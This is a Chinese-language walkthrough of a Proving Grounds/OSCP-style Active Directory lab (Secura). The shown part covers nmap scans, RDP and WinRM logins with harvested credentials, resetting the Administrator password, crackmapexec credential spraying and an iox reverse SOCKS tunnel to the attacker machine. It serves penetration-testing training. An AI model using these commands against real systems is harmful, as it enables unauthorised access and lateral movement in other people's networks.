# PG_awd_WriteUp

本文按照：https://docs.google.com/spreadsheets/u/0/d/1dwSMIAPIam0PuRBkCiDI88pU3yzrqqHkDtBngUHNCw8/htmlview?pli=1#   循序进行刷题

| 平台 | 题目                   | 是否完成 |
| ---- | ---------------------- | -------- |
| PG   | Challenge 0 - Secura   |          |
| PG   | Challenge 1 - Medtech  |          |
| PG   | Challenge 2 - Relia    |          |
| PG   | Challenge 3 - Skylark  |          |
| PG   | Challenge 4 - OSCP A   |          |
| PG   | Challenge 5 - OSCP B   |          |
| PG   | Challenge 6 - OSCP C   |          |
| PG   | Challenge 7 - Zeus     |          |
| PG   | Challenge 8 - Poseidon |          |

建议openvpn配置文件添加

```
socks-proxy 172.16.1.1 7890
```

## Challenge 0 - Secura

> 给了IP：
>
> ```
> 192.168.177.97
> 192.168.177.96
> 192.168.177.95
> ```
>
> 前提：
>
> **192.168.177.97**
>
> Challenge0 - VM 1 OS Credentials:
>
> ```
> 没有提供凭据
> ```
>
> **192.168.177.96**
>
> Challenge0 - VM 2 OS Credentials:
>
> ```
> 没有提供凭据
> ```
>
> **192.168.177.95**
>
> Challenge0 - VM 3 OS Credentials:
>
> ```
> Eric.Wallows/EricLikesRunning800
> ```
> **Objectives**
>
> ```
> 我们受命对 Secura 的网络进行渗透测试。Active Directory 环境中存在多个漏洞和错误配置，攻击者可以利用这些漏洞和错误配置访问所有工作站。主要目标是获取域控制器的访问权限。
> 
> 网络的公有子网位于 192.168.xx.0/24 范围内，其中第三个八位字节的 xx 可以从控制面板的 IP 地址字段中找到。
> 
> 尽管这个挑战实验室并非模拟考试，但它已设置为使用 OSCP+ 考试中出现的“假设入侵”场景。可以使用以下凭据开始您的攻击：用户名：Eric.Wallows 密码：EricLikesRunning800
> ```

### 192.168.177.95

既然192.168.177.95给了凭证，那就从这个机器开始

信息收集：

```
root@iZt4nbifrvtk7cy11744y4Z:~# nmap -p- -Pn -A -sS -T4 192.168.177.95
Starting Nmap 7.80 ( https://nmap.org ) at 2025-03-20 11:45 CST
NSOCK ERROR [262.1400s] mksock_bind_addr(): Bind to 0.0.0.0:88 failed (IOD #167): Address already in use (98)
Nmap scan report for 192.168.177.95
Host is up (0.0033s latency).
Not shown: 65509 closed ports
PORT      STATE SERVICE         VERSION
135/tcp   open  msrpc           Microsoft Windows RPC
139/tcp   open  netbios-ssn     Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds?
3389/tcp  open  ms-wbt-server   Microsoft Terminal Services
| rdp-ntlm-info: 
|   Target_Name: SECURA
|   NetBIOS_Domain_Name: SECURA
|   NetBIOS_Computer_Name: SECURE
|   DNS_Domain_Name: secura.yzx
|   DNS_Computer_Name: secure.secura.yzx
|   DNS_Tree_Name: secura.yzx
|   Product_Version: 10.0.19041
|_  System_Time: 2025-03-20T03:48:09+00:00
| ssl-cert: Subject: commonName=secure.secura.yzx
| Not valid before: 2025-01-09T19:31:46
|_Not valid after:  2025-07-11T19:31:46
|_ssl-date: 2025-03-20T03:49:31+00:00; 0s from scanner time.
5001/tcp  open  commplex-link?
| fingerprint-strings: 
|   SIPOptions: 
|     HTTP/1.1 200 OK
|     Content-Type: text/html; charset=ISO-8859-1
|     Content-Length: 133
|_    MAINSERVER_RESPONSE:<serverinfo method="setserverinfo" mainserver="5001" webserver="44444" pxyname="192.168.251.222" startpage=""/>
5040/tcp  open  unknown
5985/tcp  open  http            Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
7680/tcp  open  pando-pub?
8443/tcp  open  ssl/https-alt   AppManager
| fingerprint-strings: 
|   FourOhFourRequest: 
|     HTTP/1.1 404 
|     Set-Cookie: JSESSIONID_APM_44444=4FC659C562B5491CEE83E00758CCE5D4; Path=/; Secure; HttpOnly
|     Content-Type: text/html;charset=UTF-8
|     Content-Length: 973
|     Date: Thu, 20 Mar 2025 03:45:34 GMT
|     Connection: close
|     Server: AppManager
|     <!DOCTYPE html>
|     <meta http-equiv="X-UA-Compatible" content="IE=edge">
|     <html>
|     <head>
|     <title>Applications Manager</title>
|     <link REL="SHORTCUT ICON" HREF="/favicon.ico">
|     <!-- Includes commonstyle CSS and dynamic style sheet bases on user selection -->
|     <link href="/images/commonstyle.css?rev=14440" rel="stylesheet" type="text/css">
|     <link href="/images/newUI/newCommonstyle.css?rev=14260" rel="stylesheet" type="text/css">
|     <link href="/images/Grey/style.css?rev=14030" rel="stylesheet" type="text/css">
|     <meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1">
|     </head>
|     <body bgcolor="#FFFFFF" leftmarg
|   GetRequest: 
|     HTTP/1.1 200 
|     Set-Cookie: JSESSIONID_APM_44444=342C52B9E8055E7EB0911AEA69DC5BEC; Path=/; Secure; HttpOnly
|     Accept-Ranges: bytes
|     ETag: W/"261-1591621693000"
|     Last-Modified: Mon, 08 Jun 2020 13:08:13 GMT
|     Content-Type: text/html
|     Content-Length: 261
|     Date: Thu, 20 Mar 2025 03:45:33 GMT
|     Connection: close
|     Server: AppManager
|     <!-- $Id$ -->
|     <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">
|     <html>
|     <head>
|     <!-- This comment is for Instant Gratification to work applications.do -->
|     <script>
|     window.open("/webclient/common/jsp/home.jsp", "_top");
|     </script>
|     </head>
|     </html>
|   HTTPOptions: 
|     HTTP/1.1 403 
|     Set-Cookie: JSESSIONID_APM_44444=02CB80398074DAD6D3A929EA1DFD3E04; Path=/; Secure; HttpOnly
|     Cache-Control: private
|     Expires: Thu, 01 Jan 1970 00:00:00 GMT
|     Content-Type: text/html;charset=UTF-8
|     Content-Length: 1810
|     Date: Thu, 20 Mar 2025 03:45:33 GMT
|     Connection: close
|     Server: AppManager
|     <meta http-equiv="X-UA-Compatible" content="IE=edge">
|     <meta http-equiv="Content-Type" content="UTF-8">
|     <!--$Id$-->
|     <html>
|     <head>
|     <title>Applications Manager</title>
|     <link REL="SHORTCUT ICON" HREF="/favicon.ico">
|     </head>
|     <body style="background-color:#fff;">
|     <style type="text/css">
|     #container-error
|     border:1px solid #c1c1c1;
|     background: #fff; font:11px Arial, Helvetica, sans-serif; width:90%; margin:80px;
|     #header-error
|     background: #ededed; line-height:18px;
|     padding: 15px; color:#000; font-size:8px;
|     #header-error h1
|_    margin: 0; color:#000;
|_http-server-header: AppManager
|_http-title: Site doesn't have a title (text/html).
| ssl-cert: Subject: commonName=APPLICATIONSMANAGER/organizationName=WebNMS/stateOrProvinceName=Pleasanton/countryName=US
| Not valid before: 2019-02-27T11:03:03
|_Not valid after:  2050-02-27T11:03:03
|_ssl-date: 2025-03-20T03:49:31+00:00; 0s from scanner time.
12000/tcp open  cce4x?
44444/tcp open  cognex-dataman?
| fingerprint-strings: 
|   GetRequest: 
|     HTTP/1.1 200 
|     Set-Cookie: JSESSIONID_APM_44444=2D7B14F37219C401382A70F85967421D; Path=/; HttpOnly
|     Accept-Ranges: bytes
|     ETag: W/"261-1591621693000"
|     Last-Modified: Mon, 08 Jun 2020 13:08:13 GMT
|     Content-Type: text/html
|     Content-Length: 261
|     Date: Thu, 20 Mar 2025 03:45:33 GMT
|     Connection: close
|     Server: AppManager
|     <!-- $Id$ -->
|     <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">
|     <html>
|     <head>
|     <!-- This comment is for Instant Gratification to work applications.do -->
|     <script>
|     window.open("/webclient/common/jsp/home.jsp", "_top");
|     </script>
|     </head>
|     </html>
|   HTTPOptions: 
|     HTTP/1.1 403 
|     Set-Cookie: JSESSIONID_APM_44444=E13D56EB368C55C10E2F009FE7270E5B; Path=/; HttpOnly
|     Cache-Control: private
|     Expires: Thu, 01 Jan 1970 00:00:00 GMT
|     Content-Type: text/html;charset=UTF-8
|     Content-Length: 1810
|     Date: Thu, 20 Mar 2025 03:45:33 GMT
|     Connection: close
|     Server: AppManager
|     <meta http-equiv="X-UA-Compatible" content="IE=edge">
|     <meta http-equiv="Content-Type" content="UTF-8">
|     <!--$Id$-->
|     <html>
|     <head>
|     <title>Applications Manager</title>
|     <link REL="SHORTCUT ICON" HREF="/favicon.ico">
|     </head>
|     <body style="background-color:#fff;">
|     <style type="text/css">
|     #container-error
|     border:1px solid #c1c1c1;
|     background: #fff; font:11px Arial, Helvetica, sans-serif; width:90%; margin:80px;
|     #header-error
|     background: #ededed; line-height:18px;
|     padding: 15px; color:#000; font-size:8px;
|     #header-error h1
|     margin: 0; color:#000;
|     font-
|   RTSPRequest: 
|     HTTP/1.1 505 
|     vary: accept-encoding
|     Content-Type: text/html;charset=utf-8
|     Content-Language: en
|     Content-Length: 2142
|     Date: Thu, 20 Mar 2025 03:45:34 GMT
|     Server: AppManager
|     <!doctype html><html lang="en"><head><title>HTTP Status 505 
|_    HTTP Version Not Supported</title><style type="text/css">h1 {font-family:Tahoma,Arial,sans-serif;color:white;background-color:#525D76;font-size:22px;} h2 {font-family:Tahoma,Arial,sans-serif;color:white;background-color:#525D76;font-size:16px;} h3 {font-family:Tahoma,Arial,sans-serif;color:white;background-color:#525D76;font-size:14px;} body {font-family:Tahoma,Arial,sans-serif;color:black;background-color:white;} b {font-family:Tahoma,Arial,sans-serif;color:white;background-color:#525D76;} p {font-family:Tahoma,Arial,sans-serif;background:white;color:black;font-size:12px;} a {color:black;} a.name {color:black;} .line {height:1px;background-color:#
47001/tcp open  http            Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open  msrpc           Microsoft Windows RPC
49665/tcp open  msrpc           Microsoft Windows RPC
49666/tcp open  msrpc           Microsoft Windows RPC
49667/tcp open  msrpc           Microsoft Windows RPC
49668/tcp open  msrpc           Microsoft Windows RPC
49669/tcp open  msrpc           Microsoft Windows RPC
49670/tcp open  msrpc           Microsoft Windows RPC
49671/tcp open  msrpc           Microsoft Windows RPC
49672/tcp open  msrpc           Microsoft Windows RPC
49673/tcp open  tcpwrapped
51694/tcp open  java-rmi        Java RMI
51725/tcp open  unknown
62950/tcp open  unknown
| fingerprint-strings: 
|   X11Probe, ms-sql-s: 
|_    CLOSE_SESSION
62951/tcp open  unknown
| fingerprint-strings: 
|   X11Probe, ms-sql-s: 
|_    CLOSE_SESSION
5 services unrecognized despite returning data. If you know the service/version, please submit the following fingerprints at https://nmap.org/cgi-bin/submit.cgi?new-service :
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port5001-TCP:V=7.80%I=7%D=3/20%Time=67DB8FBB%P=x86_64-pc-linux-gnu%r(SI
SF:POptions,DC,"HTTP/1\.1\x20200\x20OK\r\nContent-Type:\x20text/html;\x20c
SF:harset=ISO-8859-1\r\nContent-Length:\x20133\r\n\r\nMAINSERVER_RESPONSE:
SF:<serverinfo\x20method=\"setserverinfo\"\x20mainserver=\"5001\"\x20webse
SF:rver=\"44444\"\x20pxyname=\"192\.168\.251\.222\"\x20startpage=\"\"/>\n\
SF:0\r\n");
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port8443-TCP:V=7.80%T=SSL%I=7%D=3/20%Time=67DB8F5D%P=x86_64-pc-linux-gn
SF:u%r(GetRequest,24E,"HTTP/1\.1\x20200\x20\r\nSet-Cookie:\x20JSESSIONID_A
SF:PM_44444=342C52B9E8055E7EB0911AEA69DC5BEC;\x20Path=/;\x20Secure;\x20Htt
SF:pOnly\r\nAccept-Ranges:\x20bytes\r\nETag:\x20W/\"261-1591621693000\"\r\
SF:nLast-Modified:\x20Mon,\x2008\x20Jun\x202020\x2013:08:13\x20GMT\r\nCont
SF:ent-Type:\x20text/html\r\nContent-Length:\x20261\r\nDate:\x20Thu,\x2020
SF:\x20Mar\x202025\x2003:45:33\x20GMT\r\nConnection:\x20close\r\nServer:\x
SF:20AppManager\r\n\r\n<!--\x20\$Id\$\x20-->\n<!DOCTYPE\x20HTML\x20PUBLIC\
SF:x20\"-//W3C//DTD\x20HTML\x204\.01\x20Transitional//EN\">\n<html>\n<head
SF:>\n<!--\x20This\x20comment\x20is\x20for\x20Instant\x20Gratification\x20
SF:to\x20work\x20applications\.do\x20-->\n<script>\n\n\twindow\.open\(\"/w
SF:ebclient/common/jsp/home\.jsp\",\x20\"_top\"\);\n\n</script>\n\n</head>
SF:\n</html>\n")%r(HTTPOptions,849,"HTTP/1\.1\x20403\x20\r\nSet-Cookie:\x2
SF:0JSESSIONID_APM_44444=02CB80398074DAD6D3A929EA1DFD3E04;\x20Path=/;\x20S
SF:ecure;\x20HttpOnly\r\nCache-Control:\x20private\r\nExpires:\x20Thu,\x20
SF:01\x20Jan\x201970\x2000:00:00\x20GMT\r\nContent-Type:\x20text/html;char
SF:set=UTF-8\r\nContent-Length:\x201810\r\nDate:\x20Thu,\x2020\x20Mar\x202
SF:025\x2003:45:33\x20GMT\r\nConnection:\x20close\r\nServer:\x20AppManager
SF:\r\n\r\n<meta\x20http-equiv=\"X-UA-Compatible\"\x20content=\"IE=edge\">
SF:\n<meta\x20http-equiv=\"Content-Type\"\x20content=\"UTF-8\">\n<!--\$Id\
SF:$-->\n\n\n\n\n\n\n\n\n\n<html>\n<head>\n<title>Applications\x20Manager<
SF:/title>\n\n<link\x20REL=\"SHORTCUT\x20ICON\"\x20HREF=\"/favicon\.ico\">
SF:\n\n</head>\n\n<body\x20style=\"background-color:#fff;\">\n\n<style\x20
SF:type=\"text/css\">\n\t#container-error\n\t{\n\t\tborder:1px\x20solid\x2
SF:0#c1c1c1;\n\t\tbackground:\x20#fff;\x20font:11px\x20Arial,\x20Helvetica
SF:,\x20sans-serif;\x20width:90%;\x20margin:80px;\n\t\x20\t\n\t}\n\n\t#hea
SF:der-error\n\t{\n\t\tbackground:\x20#ededed;\x20line-height:18px;\n\t\tp
SF:adding:\x2015px;\x20color:#000;\x20font-size:8px;\n\t}\n\n\t#header-err
SF:or\x20h1\n\t{\n\t\tmargin:\x200;\x20\x20color:#000;")%r(FourOhFourReque
SF:st,4C3,"HTTP/1\.1\x20404\x20\r\nSet-Cookie:\x20JSESSIONID_APM_44444=4FC
SF:659C562B5491CEE83E00758CCE5D4;\x20Path=/;\x20Secure;\x20HttpOnly\r\nCon
SF:tent-Type:\x20text/html;charset=UTF-8\r\nContent-Length:\x20973\r\nDate
SF::\x20Thu,\x2020\x20Mar\x202025\x2003:45:34\x20GMT\r\nConnection:\x20clo
SF:se\r\nServer:\x20AppManager\r\n\r\n<!DOCTYPE\x20html>\n\n<meta\x20http-
SF:equiv=\"X-UA-Compatible\"\x20content=\"IE=edge\">\n\n\n\n\n\n\n\n\n\n\n
SF:<html>\n<head>\n<title>Applications\x20Manager</title>\n\n<link\x20REL=
SF:\"SHORTCUT\x20ICON\"\x20HREF=\"/favicon\.ico\">\n\n<!--\x20Includes\x20
SF:commonstyle\x20CSS\x20and\x20dynamic\x20style\x20sheet\x20bases\x20on\x
SF:20user\x20selection\x20-->\n\n<link\x20href=\"/images/commonstyle\.css\
SF:?rev=14440\"\x20rel=\"stylesheet\"\x20type=\"text/css\">\n\n\x20\x20\x2
SF:0\x20\n\x20\x20\x20\x20\n\x20\x20\x20\x20\x20\x20\x20\x20<link\x20href=
SF:\"/images/newUI/newCommonstyle\.css\?rev=14260\"\x20rel=\"stylesheet\"\
SF:x20type=\"text/css\">\n\x20\x20\x20\x20\n\n<link\x20href=\"/images/Grey
SF:/style\.css\?rev=14030\"\x20rel=\"stylesheet\"\x20type=\"text/css\">\n\
SF:n<meta\x20http-equiv=\"Content-Type\"\x20content=\"text/html;\x20charse
SF:t=iso-8859-1\">\n</head>\n\n<body\x20bgcolor=\"#FFFFFF\"\x20leftmarg");
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port44444-TCP:V=7.80%I=7%D=3/20%Time=67DB8F5D%P=x86_64-pc-linux-gnu%r(G
SF:etRequest,246,"HTTP/1\.1\x20200\x20\r\nSet-Cookie:\x20JSESSIONID_APM_44
SF:444=2D7B14F37219C401382A70F85967421D;\x20Path=/;\x20HttpOnly\r\nAccept-
SF:Ranges:\x20bytes\r\nETag:\x20W/\"261-1591621693000\"\r\nLast-Modified:\
SF:x20Mon,\x2008\x20Jun\x202020\x2013:08:13\x20GMT\r\nContent-Type:\x20tex
SF:t/html\r\nContent-Length:\x20261\r\nDate:\x20Thu,\x2020\x20Mar\x202025\
SF:x2003:45:33\x20GMT\r\nConnection:\x20close\r\nServer:\x20AppManager\r\n
SF:\r\n<!--\x20\$Id\$\x20-->\n<!DOCTYPE\x20HTML\x20PUBLIC\x20\"-//W3C//DTD
SF:\x20HTML\x204\.01\x20Transitional//EN\">\n<html>\n<head>\n<!--\x20This\
SF:x20comment\x20is\x20for\x20Instant\x20Gratification\x20to\x20work\x20ap
SF:plications\.do\x20-->\n<script>\n\n\twindow\.open\(\"/webclient/common/
SF:jsp/home\.jsp\",\x20\"_top\"\);\n\n</script>\n\n</head>\n</html>\n")%r(
SF:HTTPOptions,841,"HTTP/1\.1\x20403\x20\r\nSet-Cookie:\x20JSESSIONID_APM_
SF:44444=E13D56EB368C55C10E2F009FE7270E5B;\x20Path=/;\x20HttpOnly\r\nCache
SF:-Control:\x20private\r\nExpires:\x20Thu,\x2001\x20Jan\x201970\x2000:00:
SF:00\x20GMT\r\nContent-Type:\x20text/html;charset=UTF-8\r\nContent-Length
SF::\x201810\r\nDate:\x20Thu,\x2020\x20Mar\x202025\x2003:45:33\x20GMT\r\nC
SF:onnection:\x20close\r\nServer:\x20AppManager\r\n\r\n<meta\x20http-equiv
SF:=\"X-UA-Compatible\"\x20content=\"IE=edge\">\n<meta\x20http-equiv=\"Con
SF:tent-Type\"\x20content=\"UTF-8\">\n<!--\$Id\$-->\n\n\n\n\n\n\n\n\n\n<ht
SF:ml>\n<head>\n<title>Applications\x20Manager</title>\n\n<link\x20REL=\"S
SF:HORTCUT\x20ICON\"\x20HREF=\"/favicon\.ico\">\n\n</head>\n\n<body\x20sty
SF:le=\"background-color:#fff;\">\n\n<style\x20type=\"text/css\">\n\t#cont
SF:ainer-error\n\t{\n\t\tborder:1px\x20solid\x20#c1c1c1;\n\t\tbackground:\
SF:x20#fff;\x20font:11px\x20Arial,\x20Helvetica,\x20sans-serif;\x20width:9
SF:0%;\x20margin:80px;\n\t\x20\t\n\t}\n\n\t#header-error\n\t{\n\t\tbackgro
SF:und:\x20#ededed;\x20line-height:18px;\n\t\tpadding:\x2015px;\x20color:#
SF:000;\x20font-size:8px;\n\t}\n\n\t#header-error\x20h1\n\t{\n\t\tmargin:\
SF:x200;\x20\x20color:#000;\n\t\tfont-")%r(RTSPRequest,912,"HTTP/1\.1\x205
SF:05\x20\r\nvary:\x20accept-encoding\r\nContent-Type:\x20text/html;charse
SF:t=utf-8\r\nContent-Language:\x20en\r\nContent-Length:\x202142\r\nDate:\
SF:x20Thu,\x2020\x20Mar\x202025\x2003:45:34\x20GMT\r\nServer:\x20AppManage
SF:r\r\n\r\n<!doctype\x20html><html\x20lang=\"en\"><head><title>HTTP\x20St
SF:atus\x20505\x20\xe2\x80\x93\x20HTTP\x20Version\x20Not\x20Supported</tit
SF:le><style\x20type=\"text/css\">h1\x20{font-family:Tahoma,Arial,sans-ser
SF:if;color:white;background-color:#525D76;font-size:22px;}\x20h2\x20{font
SF:-family:Tahoma,Arial,sans-serif;color:white;background-color:#525D76;fo
SF:nt-size:16px;}\x20h3\x20{font-family:Tahoma,Arial,sans-serif;color:whit
SF:e;background-color:#525D76;font-size:14px;}\x20body\x20{font-family:Tah
SF:oma,Arial,sans-serif;color:black;background-color:white;}\x20b\x20{font
SF:-family:Tahoma,Arial,sans-serif;color:white;background-color:#525D76;}\
SF:x20p\x20{font-family:Tahoma,Arial,sans-serif;background:white;color:bla
SF:ck;font-size:12px;}\x20a\x20{color:black;}\x20a\.name\x20{color:black;}
SF:\x20\.line\x20{height:1px;background-color:#");
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port62950-TCP:V=7.80%I=7%D=3/20%Time=67DB8F98%P=x86_64-pc-linux-gnu%r(X
SF:11Probe,1A,"\0\0\0\x16\0\rCLOSE_SESSION\0\x010\0\0\0\0")%r(ms-sql-s,1A,
SF:"\0\0\0\x16\0\rCLOSE_SESSION\0\x010\0\0\0\0");
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port62951-TCP:V=7.80%I=7%D=3/20%Time=67DB8F99%P=x86_64-pc-linux-gnu%r(X
SF:11Probe,1A,"\0\0\0\x16\0\rCLOSE_SESSION\0\x010\0\0\0\0")%r(ms-sql-s,1A,
SF:"\0\0\0\x16\0\rCLOSE_SESSION\0\x010\0\0\0\0");
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.80%E=4%D=3/20%OT=135%CT=1%CU=39528%PV=Y%DS=4%DC=T%G=Y%TM=67DB90
OS:4C%P=x86_64-pc-linux-gnu)SEQ(SP=107%GCD=1%ISR=109%TI=I%CI=I%TS=U)OPS(O1=
OS:M54ENW8NNS%O2=M54ENW8NNS%O3=M54ENW8%O4=M54ENW8NNS%O5=M54ENW8NNS%O6=M54EN
OS:NS)WIN(W1=FFFF%W2=FFFF%W3=FFFF%W4=FFFF%W5=FFFF%W6=FF70)ECN(R=Y%DF=Y%T=80
OS:%W=FFFF%O=M54ENW8NNS%CC=N%Q=)T1(R=Y%DF=Y%T=80%S=O%A=S+%F=AS%RD=0%Q=)T2(R
OS:=N)T3(R=N)T4(R=Y%DF=Y%T=80%W=0%S=A%A=O%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=80%W
OS:=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=80%W=0%S=A%A=O%F=R%O=%RD=0%Q=)
OS:T7(R=N)U1(R=Y%DF=N%T=80%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)I
OS:E(R=N)

Network Distance: 4 hops
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2025-03-20T03:48:11
|_  start_date: N/A

TRACEROUTE (using port 3306/tcp)
HOP RTT     ADDRESS
1   2.30 ms 192.168.45.1
2   2.30 ms 192.168.45.254
3   2.95 ms 192.168.251.1
4   3.71 ms 192.168.177.95

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 263.30 seconds
```

我们已经有一个凭证了，首先值得尝试的就是RDP登录

```
xfreerdp /u:'Eric.Wallows' /p:'EricLikesRunning800' /v:192.168.177.95 +clipboard
```

![image-20250320115533639](./oscp_pwk.assets/image-20250320115533639.png)

成功登录RDP，回头看nmap结果，8443开放的有https服务

![image-20250320120301500](./oscp_pwk.assets/image-20250320120301500.png)

使用admin/admin成功登录

![image-20250320120338838](./oscp_pwk.assets/image-20250320120338838.png)

查看网口信息，DNS服务器为192.168.177.97，这个IP大概率是域控

![image-20250320120529014](./oscp_pwk.assets/image-20250320120529014.png)

检索漏洞发现该站点存在一个权限提升的漏洞

![image-20250320121652208](./oscp_pwk.assets/image-20250320121652208.png)

查看漏洞

![image-20250320121823249](./oscp_pwk.assets/image-20250320121823249.png)

在该网站目录bin\ChangeJRE.bat可以添加，但是我没找到该文件，后面又翻了翻发现是版本不对

![image-20250320122822024](./oscp_pwk.assets/image-20250320122822024.png)

框架为`Applications Manager 14 OEM 14710`（我一开始以为需要用这个框架的什么问题提权

然后偶然发现`Eric.Wallows`属于管理员组？！

![image-20250320130216015](./oscp_pwk.assets/image-20250320130216015.png)

直接ctrl_shift_enter启动一个cmd

![image-20250320130333323](./oscp_pwk.assets/image-20250320130333323.png)

直接修改Administrator密码

```
net user Administrator 123@Abc
```

![image-20250320130414467](./oscp_pwk.assets/image-20250320130414467.png)

重新登录在桌面拿到proof（其实这里直接type应该也可以

然后在回收站找到了被删除的ps历史命令

![image-20250320130608056](./oscp_pwk.assets/image-20250320130608056.png)

拿出来查看，尝试运行`Test-ComputerSecureChannel`输出为True

> 解释为：
>
> **通过检查其信任关系的状态来验证本地计算机与其域之间的通道是否正常工作**。 如果连接失败，可以使用修复参数尝试还原它。 如果通道正常工作， Test-ComputerSecureChannel 返回True;如果通道未正常工作，则返回False。

![image-20250320130658971](./oscp_pwk.assets/image-20250320130658971.png)

这台机器就结束了，刚刚通过DNS猜测域控为97，那下一台我们就攻击96，用攻击机尝试ping是可以通的，

### 192.168.177.96

使用nmap扫描

```
root@iZt4nbifrvtk7cy11744y4Z:~# nmap -p- -Pn -A -sS -T4 192.168.177.96
Starting Nmap 7.80 ( https://nmap.org ) at 2025-03-20 13:09 CST
Nmap scan report for 192.168.177.96
Host is up (0.0062s latency).
Not shown: 65520 closed ports
PORT      STATE SERVICE       VERSION
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds?
3306/tcp  open  mysql?
| fingerprint-strings: 
|   ms-sql-s: 
|_    Host '192.168.251.222' is not allowed to connect to this MariaDB server
5040/tcp  open  unknown
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
49669/tcp open  msrpc         Microsoft Windows RPC
49670/tcp open  msrpc         Microsoft Windows RPC
49690/tcp open  msrpc         Microsoft Windows RPC
49691/tcp open  msrpc         Microsoft Windows RPC
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port3306-TCP:V=7.80%I=7%D=3/20%Time=67DBA31E%P=x86_64-pc-linux-gnu%r(ms
SF:-sql-s,4E,"J\0\0\x01\xffj\x04Host\x20'192\.168\.251\.222'\x20is\x20not\
SF:x20allowed\x20to\x20connect\x20to\x20this\x20MariaDB\x20server");
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.80%E=4%D=3/20%OT=135%CT=1%CU=34967%PV=Y%DS=4%DC=T%G=Y%TM=67DBA3
OS:CB%P=x86_64-pc-linux-gnu)SEQ(SP=108%GCD=1%ISR=107%TI=I%CI=I%TS=U)OPS(O1=
OS:M54ENW8NNS%O2=M54ENW8NNS%O3=M54ENW8%O4=M54ENW8NNS%O5=M54ENW8NNS%O6=M54EN
OS:NS)WIN(W1=FFFF%W2=FFFF%W3=FFFF%W4=FFFF%W5=FFFF%W6=FF70)ECN(R=Y%DF=Y%T=80
OS:%W=FFFF%O=M54ENW8NNS%CC=N%Q=)T1(R=Y%DF=Y%T=80%S=O%A=S+%F=AS%RD=0%Q=)T2(R
OS:=N)T3(R=N)T4(R=Y%DF=Y%T=80%W=0%S=A%A=O%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=80%W
OS:=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=80%W=0%S=A%A=O%F=R%O=%RD=0%Q=)
OS:T7(R=N)U1(R=Y%DF=N%T=80%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)I
OS:E(R=N)

Network Distance: 4 hops
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2025-03-20T05:12:28
|_  start_date: N/A

TRACEROUTE (using port 110/tcp)
HOP RTT     ADDRESS
1   3.10 ms 192.168.45.1
2   3.08 ms 192.168.45.254
3   3.35 ms 192.168.251.1
4   3.69 ms 192.168.177.96

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 203.72 seconds
```

这里通过mysql报错发现我们的IP为：192.168.251.177（怪不得我用V*N的IP一直收不到返回的信息

有用的就是mysql感觉

搭建隧道代理

```
kali运行
/root/tools/iox/iox proxy -l 90 -l 1080
靶机运行
.\iox.exe  proxy -r 192.168.177.222:90
```

还是连不了

直接使用evil-winrm

```
evil-winrm -i 192.168.177.96 -u administrator -p '123@Abc'
```

连接失败，在95的RDP上最近使用文件中翻到一个凭证：apache/New2Era4.!

![image-20250320175435590](./oscp_pwk.assets/image-20250320175435590.png)

使用crackmapexec验证凭证（`--local-auth`一定要加上，用本地认证，而非域认证

```
crackmapexec winrm 192.168.177.95-97 -u 'apache' -p 'New2Era4.!' --local-auth
```

![image-20250320180332992](./oscp_pwk.assets/image-20250320180332992.png)

该凭证可以登录96，使用winrm登录

```
evil-winrm -i 192.168.177.96 -u apache -p 'New2Era4.!'
```

![image-20250320180751572](./oscp_pwk.assets/image-20250320180751572.png)

成功登录，没有找到local，使用iox代理出来

```
kali运行
/root/tools/iox/iox proxy -l 90 -l 1080
靶机运行(192.168.45.184是攻击机IP)
.\iox.exe proxy -r 192.168.251.177:90
```

尝试连接mysql，需要使用`--skip-ssl`跳过SSL，不然连接不上（这里我尝试了很多密码，但是没想到是空密码......

```
proxychains4 mysql -h127.0.0.1 -uroot -p --skip-ssl
```

![image-20250320183435985](./oscp_pwk.assets/image-20250320183435985.png)

